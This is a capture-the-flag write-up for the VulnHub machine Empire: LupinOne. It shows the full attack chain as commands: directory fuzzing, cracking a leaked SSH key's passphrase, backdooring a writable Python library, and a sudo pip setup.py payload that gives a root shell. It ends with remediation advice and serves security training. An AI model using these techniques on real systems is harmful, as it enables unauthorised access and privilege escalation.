# Empire: LupinOne — Writeup

| | |
|-|-|
| **Target IP** | 192.168.1.2 (host-only) |
| **Difficulty** | Easy-Medium |
| **OS** | Linux |
| **Root Flag** | via `sudo pip` GTFOBins |
| **Authors** | icex64 & Empire Cybersecurity |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/empire-lupinone,750/) |

## Attack Summary

nmap → `/~secret` (ffuf) → `.mysecret.txt` (Base58 SSH key) → ssh2john → john → SSH as icex64 → sudo heist.py (webbrowser.py library hijack) → arsene → sudo pip GTFOBins → root

## Methodology

1. Network discovery
2. FFUF directory and file fuzzing under user directories
3. Base58 decode of SSH private key
4. SSH key passphrase cracking
5. Python library hijack (icex64 → arsene)
6. sudo pip privilege escalation (arsene → root)

---

## Step 1: Network Discovery

```bash
netdiscover
nmap -sC -sV 192.168.1.2
```

Open ports:
- **22** — SSH
- **80** — Apache HTTP, `/~myfiles` path suggested

---

## Step 2: Directory Fuzzing

Browse to `http://192.168.1.2/~myfiles/` — returns 404 with a hint in the page source.

Fuzz for other user directories:

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u 'http://192.168.1.2/~FUZZ'
```

Finds `secret`. Now fuzz for hidden files inside it:

```bash
ffuf -c -ic \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u 'http://192.168.1.2/~secret/.FUZZ' \
  -fc 403 -e .txt,.html
```

Finds `.mysecret.txt`.

![ffuf results](images/02-ffuf.png)

---

## Step 3: SSH Key Recovery

```bash
curl http://192.168.1.2/~secret/.mysecret.txt -o mysecret.txt
cat mysecret.txt
# Base58-encoded SSH private key
```

Decode with python or an online tool:

```bash
python3 -c "
import base58
with open('mysecret.txt') as f:
    data = f.read().strip()
decoded = base58.b58decode(data)
print(decoded.decode())
" > sshkey
chmod 600 sshkey
```

![Decoded key](images/03-sshkey.png)

---

## Step 4: Crack SSH Key Passphrase

Extract the hash from the key and crack it:

```bash
python /usr/share/john/ssh2john.py sshkey > key.hash
john --wordlist=/usr/share/wordlists/fastrack.txt key.hash
```

Passphrase: **P@55w0rd!**

Log in as `icex64`:

```bash
ssh -i sshkey icex64@192.168.1.2
# passphrase: P@55w0rd!
```

---

## Step 5: Python Library Hijack (icex64 → arsene)

```bash
sudo -l
# (icex64) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
cat /home/arsene/heist.py
# imports webbrowser
```

Find `webbrowser.py` and check if writable:

```bash
locate webbrowser.py
ls -la /usr/lib/python3.9/webbrowser.py
```

Add a backdoor to the library:

```python
import os
os.system("/bin/bash")
```

```bash
# Insert at the top of webbrowser.py
sudo python3.9 /home/arsene/heist.py
# spawns shell as arsene
```

![Library hijack](images/04-privesc1.png)

---

## Step 6: sudo pip → root

```bash
sudo -l
# (arsene) NOPASSWD: /usr/bin/pip
```

GTFOBins technique:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
id
# uid=0(root)
cat /root/root.txt
```

![Root shell](images/05-root.png)

---

## Lessons Learned

1. **Sensitive files in user web directories** — `~username/` paths expose files that should never be web-accessible
2. **Base58-encoded secrets** — encoding is not encryption; any observer can decode it
3. **Weak SSH key passphrase** — `P@55w0rd!` is in common wordlists; use strong random passphrases
4. **Python library hijacking via sudo** — same class as Corrosion-2; restrict `PYTHONPATH` and audit library permissions
5. **sudo pip without restrictions** — pip runs `setup.py` as root, trivially executing arbitrary code

## Remediation

| Vulnerability | Fix |
|---------------|-----|
| SSH key in web-accessible path | Remove user dirs from Apache config; store keys securely |
| Weak key passphrase | Use passphrase ≥ 20 chars; consider hardware keys |
| Writable Python library in sudo path | Audit file permissions; restrict sudoers with explicit env |
| `sudo pip` | Remove from sudoers; use a virtualenv or package manager with restricted scope |
